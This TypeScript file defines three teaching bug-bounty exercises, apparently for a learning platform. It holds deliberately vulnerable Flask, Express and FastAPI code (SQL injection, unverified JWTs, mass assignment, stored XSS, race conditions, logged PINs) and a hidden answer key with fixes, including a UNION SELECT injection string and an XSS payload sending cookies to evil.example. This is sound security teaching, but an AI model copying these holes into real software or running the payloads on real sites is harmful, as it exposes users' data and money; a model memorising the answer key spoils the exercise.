/**
 * Layerflow's own bug-bounty programs — small, realistic codebases with real
 * bugs planted in them (the kind that show up in real bounty reports: SQL
 * injection, IDOR, broken JWT checks, mass assignment, XSS, race conditions,
 * money maths, data exposure, off-by-one).
 *
 * 🔒 Like hidden tests, `bugs` never leave the API: publicProgram() strips
 * them, and the secrecy check in harness T8 scans every public response for
 * their titles, nudges and line numbers.
 *
 * A bug's location is found by an `anchor` — a substring of exactly one line —
 * so editing a file never silently moves a bug.
 */
import type { BountyCategory, BountySeverity } from "./bounty.ts";

export interface PlantedBug {
  id: string;
  file: string;
  /** a substring of exactly one line in `file` */
  anchor: string;
  /** accepted lines around the anchor: [before, after] */
  span: [number, number];
  category: BountyCategory;
  /** other categories a fair report could use for the same bug */
  alsoAccept?: BountyCategory[];
  severity: BountySeverity;
  /** shown only after the learner finds it */
  title: string;
  explanation: string;
  fix: string;
  /** prose-only nudge — where to look, never what's wrong */
  nudge: string;
}

export interface BuiltInProgram {
  id: string;
  company: string;
  logo: string;
  title: string;
  tagline: string;
  difficulty: "beginner" | "intermediate" | "advanced";
  stack: string[];
  summary: string;
  scope: string[];
  out_of_scope: string[];
  rules: string[];
  rewards: Record<BountySeverity, number>;
  files: { path: string; language: string; content: string }[];
  bugs: PlantedBug[];
}

const PLATFORM_REWARDS: Record<BountySeverity, number> = { critical: 1000, high: 600, medium: 300, low: 120 };

const COMMON_RULES = [
  "Read the code like an attacker would: where does input come in, and where does it end up?",
  "Report one bug per report: point at the line, pick the kind of bug, explain what an attacker could do.",
  "A nudge costs half of that bug's reward. Wrong reports cost nothing — but you get 10 reports per program per day.",
  "Never try these tricks on a real website you don't have permission to test.",
];

/* ───────────────────────── ShopKart · Python / Flask ───────────────────────── */

const SHOPKART: BuiltInProgram = {
  id: "shopkart",
  company: "ShopKart (demo)",
  logo: "🛒",
  title: "ShopKart — online shop API",
  tagline: "Find what lets a shopper steal, snoop or overpay.",
  difficulty: "beginner",
  stack: ["Python", "Flask", "SQLite"],
  summary:
    "ShopKart is a small online shop: people log in, browse products, add them to a cart and check out. It is the kind of backend a two-person startup ships in a weekend — and it has five real bugs, from a page that skips products to one that hands any visitor the whole database.",
  scope: ["app.py — every route", "auth.py — login and tokens", "pricing.py — cart totals and coupons", "db.py — all SQL"],
  out_of_scope: ["The Flask framework itself", "Missing rate limits on /login (known, accepted)", "Style and naming"],
  rules: COMMON_RULES,
  rewards: PLATFORM_REWARDS,
  files: [
    {
      path: "README.md",
      language: "markdown",
      content: `# ShopKart API

A tiny online shop backend (Flask + SQLite).

| Route | What it does |
|---|---|
| POST /login | email + password → token |
| GET /products?page=1 | 10 products per page |
| GET /search?q=shoe | search products by name |
| POST /cart/add | add a product to your cart |
| POST /checkout | turn your cart into an order |
| GET /orders/<id> | look at one of your orders |

Prices are stored in paise (integers), so ₹499 is 49900.
`,
    },
    {
      path: "app.py",
      language: "python",
      content: `"""ShopKart API — a tiny online shop (Flask)."""
from flask import Flask, jsonify, request

import auth
import db
import pricing

app = Flask(__name__)
PAGE_SIZE = 10


@app.post("/login")
def login():
    body = request.get_json()
    user = auth.check_password(body["email"], body["password"])
    if not user:
        return jsonify(error="wrong email or password"), 401
    return jsonify(token=auth.issue_token(user["id"]))


@app.get("/products")
def products():
    page = int(request.args.get("page", 1))
    offset = page * PAGE_SIZE
    rows = db.query("SELECT id, name, price FROM products ORDER BY id LIMIT ? OFFSET ?", (PAGE_SIZE, offset))
    return jsonify(products=rows, page=page)


@app.get("/search")
def search():
    q = request.args.get("q", "")
    rows = db.query(f"SELECT id, name, price FROM products WHERE name LIKE '%{q}%'")
    return jsonify(results=rows)


@app.post("/cart/add")
def add_to_cart():
    user = auth.current_user(request)
    body = request.get_json()
    qty = int(body.get("qty", 1))
    product = db.get_product(body["product_id"])
    if product is None:
        return jsonify(error="no such product"), 404
    db.add_cart_item(user["id"], product["id"], qty)
    return jsonify(ok=True)


@app.post("/checkout")
def checkout():
    user = auth.current_user(request)
    cart = db.cart_items(user["id"])
    coupon = request.get_json().get("coupon")
    total = pricing.cart_total(cart, coupon)
    order_id = db.create_order(user["id"], cart, total)
    return jsonify(order_id=order_id, total=total)


@app.get("/orders/<int:order_id>")
def get_order(order_id):
    user = auth.current_user(request)
    order = db.get_order(order_id)
    if order is None:
        return jsonify(error="not found"), 404
    return jsonify(order)
`,
    },
    {
      path: "auth.py",
      language: "python",
      content: `"""Login and tokens."""
import hashlib
import secrets

import db

TOKENS = {}


def check_password(email, password):
    user = db.find_user_by_email(email)
    if user is None:
        return None
    hashed = hashlib.md5(password.encode()).hexdigest()
    if hashed == user["password_hash"]:
        return user
    return None


def issue_token(user_id):
    token = secrets.token_urlsafe(32)
    TOKENS[token] = user_id
    return token


def current_user(request):
    token = request.headers.get("Authorization", "").removeprefix("Bearer ")
    user_id = TOKENS.get(token)
    if user_id is None:
        raise PermissionError("log in first")
    return db.get_user(user_id)
`,
    },
    {
      path: "pricing.py",
      language: "python",
      content: `"""Money maths for the cart. Prices are in paise (integers)."""

COUPONS = {"WELCOME10": 10, "DIWALI25": 25}
FREE_DELIVERY_FROM = 49900
DELIVERY_FEE = 4000


def line_total(item):
    return item["price"] * item["qty"]


def cart_total(cart, coupon=None):
    subtotal = sum(line_total(item) for item in cart)
    if coupon in COUPONS:
        subtotal -= subtotal * COUPONS[coupon] // 100
    delivery = 0 if subtotal >= FREE_DELIVERY_FROM else DELIVERY_FEE
    return subtotal + delivery
`,
    },
    {
      path: "db.py",
      language: "python",
      content: `"""All SQL lives here."""
import sqlite3

conn = sqlite3.connect("shop.db", check_same_thread=False)
conn.row_factory = sqlite3.Row


def query(sql, params=()):
    return [dict(r) for r in conn.execute(sql, params).fetchall()]


def get_product(product_id):
    rows = query("SELECT id, name, price FROM products WHERE id = ?", (product_id,))
    return rows[0] if rows else None


def find_user_by_email(email):
    rows = query("SELECT id, email, password_hash FROM users WHERE email = ?", (email,))
    return rows[0] if rows else None


def get_user(user_id):
    rows = query("SELECT id, email FROM users WHERE id = ?", (user_id,))
    return rows[0] if rows else None


def add_cart_item(user_id, product_id, qty):
    conn.execute("INSERT INTO cart (user_id, product_id, qty) VALUES (?, ?, ?)", (user_id, product_id, qty))
    conn.commit()


def cart_items(user_id):
    return query(
        "SELECT p.id, p.name, p.price, c.qty FROM cart c JOIN products p ON p.id = c.product_id WHERE c.user_id = ?",
        (user_id,),
    )


def create_order(user_id, cart, total):
    cur = conn.execute("INSERT INTO orders (user_id, total) VALUES (?, ?)", (user_id, total))
    conn.commit()
    return cur.lastrowid


def get_order(order_id):
    rows = query("SELECT id, user_id, total, address, phone FROM orders WHERE id = ?", (order_id,))
    return rows[0] if rows else None
`,
    },
  ],
  bugs: [
    {
      id: "shopkart-sqli",
      file: "app.py",
      anchor: "WHERE name LIKE '%{q}%'",
      span: [1, 0],
      category: "injection",
      severity: "critical",
      title: "SQL injection in product search",
      explanation:
        "The search text is pasted straight into the SQL string with an f-string. Searching for ' UNION SELECT email, password_hash, 1 FROM users -- makes the database return every user's email and password hash.",
      fix: "Pass the value as a parameter: db.query(\"... WHERE name LIKE ?\", (f\"%{q}%\",)). The database then treats the text as data, never as SQL.",
      nudge: "One route builds its SQL differently from all the others. Compare how each query gets the values it needs.",
    },
    {
      id: "shopkart-idor",
      file: "app.py",
      anchor: "order = db.get_order(order_id)",
      span: [1, 3],
      category: "broken_access",
      alsoAccept: ["data_exposure"],
      severity: "high",
      title: "Anyone can read anyone's order (IDOR)",
      explanation:
        "GET /orders/<id> checks that you are logged in, but never that the order is yours. Counting up from 1 returns every customer's total, address and phone number.",
      fix: "After loading the order, check order[\"user_id\"] == user[\"id\"] and answer 404 if it isn't (404, not 403, so you don't confirm the order exists).",
      nudge: "Logging in proves who you are. Find the route that should also ask: is this thing actually yours?",
    },
    {
      id: "shopkart-negative-qty",
      file: "app.py",
      anchor: 'qty = int(body.get("qty", 1))',
      span: [0, 5],
      category: "business_logic",
      severity: "high",
      title: "Negative quantities make the cart pay you",
      explanation:
        "Nothing stops qty from being 0 or negative. Add a phone with qty 1 and a laptop with qty -1 and the total drops — far enough and checkout creates an order with a negative total.",
      fix: "Validate it: if qty < 1 or qty > 20 (a sane maximum), answer 400. Never trust a number just because it came from your own front end.",
      nudge: "Think about the cart like a shopper with bad intentions: which number can they choose freely, and what values did nobody expect?",
    },
    {
      id: "shopkart-md5",
      file: "auth.py",
      anchor: "hashlib.md5(password.encode())",
      span: [0, 1],
      category: "crypto",
      alsoAccept: ["auth"],
      severity: "medium",
      title: "Passwords are hashed with plain MD5",
      explanation:
        "MD5 is built to be fast, and there is no salt, so a leaked users table can be cracked by the billion guesses per second — and identical passwords have identical hashes.",
      fix: "Use a slow, salted password hash: bcrypt, scrypt or argon2 (e.g. werkzeug.security.generate_password_hash / check_password_hash), and compare with a constant-time check.",
      nudge: "Look at how a password is turned into the thing that gets stored. Is that the right tool for passwords specifically?",
    },
    {
      id: "shopkart-paging",
      file: "app.py",
      anchor: "offset = page * PAGE_SIZE",
      span: [1, 1],
      category: "logic",
      severity: "low",
      title: "Page 1 skips the first ten products",
      explanation: "Pages start at 1, but the offset is page × 10 — so page 1 starts at product 11 and the first ten products are never shown to anyone.",
      fix: "offset = (page - 1) * PAGE_SIZE, and reject page < 1.",
      nudge: "Work out by hand which products the very first page shows. Where does it start counting?",
    },
  ],
};

/* ───────────────────────── CampusConnect · TypeScript / Express + React ───────────────────────── */

const CAMPUS: BuiltInProgram = {
  id: "campusconnect",
  company: "CampusConnect (demo)",
  logo: "🎓",
  title: "CampusConnect — student portal",
  tagline: "Become an admin, hijack a profile, beat the OTP.",
  difficulty: "intermediate",
  stack: ["TypeScript", "Express", "React", "JWT"],
  summary:
    "CampusConnect is a college portal: students log in with a phone OTP, edit their profile and hand in assignments; teachers and admins have more power. Five bugs hide in the auth, the profile API, the React profile card and the deadline check.",
  scope: ["server/** — the Express API", "web/ProfileCard.tsx — the profile card"],
  out_of_scope: ["The SMS provider", "Denial of service by flooding requests", "Missing security headers"],
  rules: COMMON_RULES,
  rewards: PLATFORM_REWARDS,
  files: [
    {
      path: "server/index.ts",
      language: "typescript",
      content: `import express from "express";
import { requireUser } from "./auth";
import { otpRoutes } from "./routes/otp";
import { profileRoutes } from "./routes/profile";
import { assignmentRoutes } from "./routes/assignments";

const app = express();
app.use(express.json());

app.use("/api/otp", otpRoutes);
app.use("/api/profile", requireUser, profileRoutes);
app.use("/api/assignments", requireUser, assignmentRoutes);

app.listen(Number(process.env.PORT ?? 8080));
`,
    },
    {
      path: "server/auth.ts",
      language: "typescript",
      content: `import jwt from "jsonwebtoken";
import type { NextFunction, Request, Response } from "express";

export interface User {
  id: string;
  name: string;
  role: "student" | "teacher" | "admin";
}

export function signToken(user: User): string {
  return jwt.sign({ id: user.id, name: user.name, role: user.role }, process.env.JWT_SECRET!, { expiresIn: "7d" });
}

export function requireUser(req: Request, res: Response, next: NextFunction) {
  const token = req.headers.authorization?.replace("Bearer ", "");
  if (!token) return res.status(401).json({ error: "log in first" });
  const user = jwt.decode(token) as User | null;
  if (!user) return res.status(401).json({ error: "bad token" });
  res.locals.user = user;
  next();
}
`,
    },
    {
      path: "server/routes/otp.ts",
      language: "typescript",
      content: `import { Router } from "express";
import { sendSms } from "../sms";

export const otpRoutes = Router();
const pending = new Map<string, string>();

otpRoutes.post("/send", async (req, res) => {
  const phone = String(req.body.phone);
  const code = String(Math.floor(1000 + Math.random() * 9000));
  pending.set(phone, code);
  await sendSms(phone, \`Your CampusConnect code is \${code}\`);
  res.json({ ok: true });
});

otpRoutes.post("/verify", (req, res) => {
  const phone = String(req.body.phone);
  if (pending.get(phone) !== String(req.body.code)) {
    return res.status(400).json({ error: "wrong code" });
  }
  pending.delete(phone);
  res.json({ ok: true, session: phone });
});
`,
    },
    {
      path: "server/routes/profile.ts",
      language: "typescript",
      content: `import { Router } from "express";
import { db } from "../db";

export const profileRoutes = Router();

profileRoutes.get("/", async (_req, res) => {
  const me = await db.users.findById(res.locals.user.id);
  res.json(me);
});

profileRoutes.put("/", async (req, res) => {
  const me = await db.users.findById(res.locals.user.id);
  Object.assign(me, req.body);
  await db.users.save(me);
  res.json(me);
});
`,
    },
    {
      path: "server/routes/assignments.ts",
      language: "typescript",
      content: `import { Router } from "express";
import { db } from "../db";

export const assignmentRoutes = Router();

// Rule from the college: "you can hand in work until the end of the due date".
assignmentRoutes.post("/:id/submit", async (req, res) => {
  const assignment = await db.assignments.findById(req.params.id);
  if (!assignment) return res.status(404).json({ error: "no such assignment" });
  const due = new Date(assignment.dueDate); // dueDate looks like "2026-10-20"
  if (Date.now() > due.getTime()) {
    return res.status(400).json({ error: "the deadline has passed" });
  }
  await db.submissions.create({ assignmentId: assignment.id, userId: res.locals.user.id, url: req.body.url });
  res.json({ ok: true });
});
`,
    },
    {
      path: "web/ProfileCard.tsx",
      language: "tsx",
      content: `import type { User } from "./types";

export function ProfileCard({ user }: { user: User & { bio: string; avatarUrl: string } }) {
  return (
    <div className="card">
      <img src={user.avatarUrl} alt="" className="avatar" />
      <h2>{user.name}</h2>
      <p className="role">{user.role}</p>
      <div className="bio" dangerouslySetInnerHTML={{ __html: user.bio }} />
    </div>
  );
}
`,
    },
  ],
  bugs: [
    {
      id: "campus-jwt-decode",
      file: "server/auth.ts",
      anchor: "jwt.decode(token)",
      span: [1, 1],
      category: "auth",
      severity: "critical",
      title: "Tokens are decoded, never verified",
      explanation:
        "jwt.decode only reads the token — it doesn't check the signature. Anyone can write their own token saying role: \"admin\" and the server believes it.",
      fix: "Use jwt.verify(token, process.env.JWT_SECRET, { algorithms: [\"HS256\"] }) inside a try/catch, and answer 401 when it throws.",
      nudge: "A token is a signed note. Find where the server reads the note — does it ever check the signature?",
    },
    {
      id: "campus-mass-assignment",
      file: "server/routes/profile.ts",
      anchor: "Object.assign(me, req.body)",
      span: [1, 1],
      category: "broken_access",
      alsoAccept: ["auth", "business_logic"],
      severity: "high",
      title: "Mass assignment: students can make themselves admins",
      explanation:
        "Every field in the request body is copied onto the user — including role. PUT /api/profile with { \"role\": \"admin\" } is a promotion.",
      fix: "Copy only the fields a user may change: const { name, bio, avatarUrl } = req.body; and validate them. Never spread a request body into a database row.",
      nudge: "When a student edits their profile, which fields should they be allowed to change — and which fields can they actually change?",
    },
    {
      id: "campus-xss",
      file: "web/ProfileCard.tsx",
      anchor: "dangerouslySetInnerHTML",
      span: [0, 0],
      category: "xss",
      severity: "high",
      title: "Stored XSS through the profile bio",
      explanation:
        "The bio is written by the user and inserted as raw HTML. A bio like <img src=x onerror=\"fetch('//evil.example?c='+document.cookie)\"> runs in every visitor's browser.",
      fix: "Render it as text: <p className=\"bio\">{user.bio}</p>. If you truly need formatting, sanitise with a library like DOMPurify first.",
      nudge: "React escapes text for you — unless you ask it not to. Look for the one place where it's asked not to.",
    },
    {
      id: "campus-otp-bruteforce",
      file: "server/routes/otp.ts",
      anchor: "if (pending.get(phone) !== String(req.body.code))",
      span: [1, 2],
      category: "auth",
      alsoAccept: ["crypto"],
      severity: "medium",
      title: "The 4-digit OTP can be brute-forced",
      explanation: "There are only 9,000 possible codes and /verify never limits wrong guesses, so a script logs into any phone number in a few minutes.",
      fix: "Allow ~5 attempts per code, then delete it; expire codes after 5 minutes; use 6 digits from crypto.randomInt(); rate-limit /send per phone.",
      nudge: "Count how many different codes exist, then look at what happens after a wrong guess.",
    },
    {
      id: "campus-deadline",
      file: "server/routes/assignments.ts",
      anchor: "if (Date.now() > due.getTime())",
      span: [1, 0],
      category: "logic",
      alsoAccept: ["business_logic"],
      severity: "low",
      title: "Work is rejected on the due date itself",
      explanation:
        "new Date(\"2026-10-20\") is midnight at the START of that day (UTC — 05:30 in India). The rule says students have until the END of the due date, so they lose the whole day.",
      fix: "Compare against the end of the day in the college's time zone (e.g. dueDate + 'T23:59:59+05:30'), or store a full due timestamp.",
      nudge: "Read the college's rule in the comment, then work out what moment that date string actually turns into.",
    },
  ],
};

/* ───────────────────────── PayLite · Python / FastAPI wallet ───────────────────────── */

const PAYLITE: BuiltInProgram = {
  id: "paylite",
  company: "PayLite (demo)",
  logo: "💸",
  title: "PayLite — UPI-style wallet",
  tagline: "Money bugs: make it, move it, or leak it.",
  difficulty: "advanced",
  stack: ["Python", "FastAPI", "SQL"],
  summary:
    "PayLite is a wallet: log in with a PIN, send money to another wallet, see your statement. Money code has to be perfect — and this one has six bugs, including two that print money and one that leaks PINs.",
  scope: ["wallet/api.py — the HTTP layer", "wallet/service.py — transfers", "wallet/fees.py — fees", "wallet/store.py — persistence"],
  out_of_scope: ["The database server itself", "Brute-forcing PINs (rate-limited by the gateway)", "TLS / hosting"],
  rules: COMMON_RULES,
  rewards: PLATFORM_REWARDS,
  files: [
    {
      path: "wallet/api.py",
      language: "python",
      content: `"""HTTP layer for PayLite (FastAPI). Amounts arrive in rupees, are stored in paise."""
import logging

from fastapi import FastAPI, HTTPException, Request

from wallet import auth, service, store

app = FastAPI()
log = logging.getLogger("paylite")


@app.post("/login")
async def login(request: Request):
    body = await request.json()
    phone, pin = body["phone"], body["pin"]
    log.info(f"login attempt phone={phone} pin={pin}")
    if not auth.check_pin(phone, pin):
        raise HTTPException(401, "wrong phone or PIN")
    return {"token": auth.issue_token(phone)}


@app.post("/transfer")
async def transfer(request: Request):
    user = auth.current_user(request)
    body = await request.json()
    amount = int(float(body["amount"]) * 100)
    try:
        return service.transfer(user.wallet_id, body["to"], amount)
    except service.TransferError as e:
        raise HTTPException(400, str(e))


@app.get("/statement")
def statement(request: Request):
    user = auth.current_user(request)
    txns = store.transfers_for(user.wallet_id)
    avg = sum(t["amount"] for t in txns) / len(txns)
    return {"transactions": txns, "average": avg}
`,
    },
    {
      path: "wallet/service.py",
      language: "python",
      content: `"""Wallet transfers. Balances are stored in paise (integers)."""
from wallet import store
from wallet.fees import transfer_fee


class TransferError(Exception):
    pass


def transfer(sender_id, receiver_id, amount):
    sender = store.get_wallet(sender_id)
    receiver = store.get_wallet(receiver_id)
    if receiver is None:
        raise TransferError("no such wallet")

    fee = transfer_fee(amount)
    if sender.balance < amount + fee:
        raise TransferError("not enough balance")
    sender.balance -= amount + fee
    receiver.balance += amount
    store.save(sender)
    store.save(receiver)

    store.log_transfer(sender_id, receiver_id, amount, fee)
    return {"ok": True, "balance": sender.balance}
`,
    },
    {
      path: "wallet/fees.py",
      language: "python",
      content: `"""Transfer fees: 1.8% of the amount, in paise."""


def transfer_fee(amount):
    return amount * 18 // 1000
`,
    },
    {
      path: "wallet/store.py",
      language: "python",
      content: `"""Persistence. Every call returns a fresh copy of the row."""
from dataclasses import dataclass

from wallet import db


@dataclass
class Wallet:
    id: str
    owner_phone: str
    balance: int


def get_wallet(wallet_id):
    row = db.fetch_one("SELECT id, owner_phone, balance FROM wallets WHERE id = ?", (wallet_id,))
    return Wallet(**row) if row else None


def save(wallet):
    db.execute("UPDATE wallets SET balance = ? WHERE id = ?", (wallet.balance, wallet.id))


def transfers_for(wallet_id):
    return db.fetch_all(
        "SELECT id, sender, receiver, amount, fee, at FROM transfers WHERE sender = ? OR receiver = ? ORDER BY at DESC",
        (wallet_id, wallet_id),
    )


def log_transfer(sender, receiver, amount, fee):
    db.execute("INSERT INTO transfers (sender, receiver, amount, fee) VALUES (?, ?, ?, ?)", (sender, receiver, amount, fee))
`,
    },
    {
      path: "wallet/auth.py",
      language: "python",
      content: `"""PIN login. PINs are stored as salted scrypt hashes."""
import hashlib
import hmac
import secrets

from wallet import db

TOKENS = {}


def check_pin(phone, pin):
    row = db.fetch_one("SELECT salt, pin_hash FROM users WHERE phone = ?", (phone,))
    if row is None:
        return False
    attempt = hashlib.scrypt(pin.encode(), salt=row["salt"], n=2**14, r=8, p=1)
    return hmac.compare_digest(attempt, row["pin_hash"])


def issue_token(phone):
    token = secrets.token_urlsafe(32)
    TOKENS[token] = phone
    return token


def current_user(request):
    token = request.headers.get("authorization", "").removeprefix("Bearer ")
    phone = TOKENS.get(token)
    if phone is None:
        raise PermissionError("log in first")
    return db.fetch_user(phone)
`,
    },
  ],
  bugs: [
    {
      id: "paylite-negative-amount",
      file: "wallet/api.py",
      anchor: 'amount = int(float(body["amount"]) * 100)',
      span: [0, 2],
      category: "business_logic",
      severity: "critical",
      title: "Negative transfers pull money out of other wallets",
      explanation:
        "Nobody checks that the amount is positive. Sending -500 to someone makes the sender's balance go UP and the receiver's go down — a free withdrawal from any wallet.",
      fix: "Reject amount <= 0 (and absurdly large amounts) in the API, and check again in service.transfer — money rules belong in the service, not only at the edge.",
      nudge: "A transfer amount is a number the user types. Which values of it did nobody think about?",
    },
    {
      id: "paylite-self-transfer",
      file: "wallet/service.py",
      anchor: "receiver = store.get_wallet(receiver_id)",
      span: [1, 2],
      category: "business_logic",
      alsoAccept: ["logic"],
      severity: "high",
      title: "Sending money to yourself creates money",
      explanation:
        "If sender and receiver are the same wallet, two separate copies are loaded. The sender copy is debited, the receiver copy (still the old balance) is credited and saved last — so you end up richer by the amount.",
      fix: "Reject sender_id == receiver_id, and do the update in SQL inside one transaction (UPDATE wallets SET balance = balance - ? WHERE id = ? AND balance >= ?).",
      nudge: "store.get_wallet returns a fresh copy every time. What if both ids in a transfer are the same?",
    },
    {
      id: "paylite-race",
      file: "wallet/service.py",
      anchor: "if sender.balance < amount + fee:",
      span: [0, 5],
      category: "race_condition",
      severity: "high",
      title: "Double spending with two requests at once",
      explanation:
        "The balance is checked, then saved later, with nothing locking the wallet in between. Two transfers sent at the same moment both pass the check and both spend the same money.",
      fix: "Do check-and-debit in ONE atomic statement inside a transaction (UPDATE … SET balance = balance - ? WHERE id = ? AND balance >= ?, then check rows affected), or lock the row (SELECT … FOR UPDATE).",
      nudge: "Imagine two copies of this function running at exactly the same moment for the same sender.",
    },
    {
      id: "paylite-pin-log",
      file: "wallet/api.py",
      anchor: 'log.info(f"login attempt phone={phone} pin={pin}")',
      span: [0, 0],
      category: "data_exposure",
      severity: "medium",
      title: "PINs are written to the logs",
      explanation: "Every login attempt logs the PIN in plain text. Logs are shipped to dashboards, shared with support and kept for months — anyone who can read them can log in as anyone.",
      fix: "Never log secrets. Log the phone (or better, a user id) and the outcome only.",
      nudge: "Secrets can leak without any attacker at all. Follow where the login details go besides the PIN check.",
    },
    {
      id: "paylite-fee-rounding",
      file: "wallet/fees.py",
      anchor: "return amount * 18 // 1000",
      span: [0, 0],
      category: "business_logic",
      alsoAccept: ["logic"],
      severity: "low",
      title: "Small transfers pay no fee at all",
      explanation: "Integer division rounds DOWN, so any transfer under 56 paise has a fee of 0. Splitting ₹1,000 into thousands of tiny transfers avoids the fee completely.",
      fix: "Round fees up (ceil division: -(-amount * 18 // 1000)) and set a minimum fee or a minimum transfer amount.",
      nudge: "Work the fee out by hand for a very small amount, like 50 paise.",
    },
    {
      id: "paylite-statement-crash",
      file: "wallet/api.py",
      anchor: 'avg = sum(t["amount"] for t in txns) / len(txns)',
      span: [0, 0],
      category: "crash",
      alsoAccept: ["logic"],
      severity: "low",
      title: "A brand-new wallet crashes the statement page",
      explanation: "A wallet with no transfers yet has an empty list, so len(txns) is 0 and the division raises ZeroDivisionError — a 500 error for every new user.",
      fix: "avg = sum(...) / len(txns) if txns else 0",
      nudge: "Every new user starts the same way. What does their statement contain on day one?",
    },
  ],
};

export const BUILT_IN_PROGRAMS: BuiltInProgram[] = [SHOPKART, CAMPUS, PAYLITE];
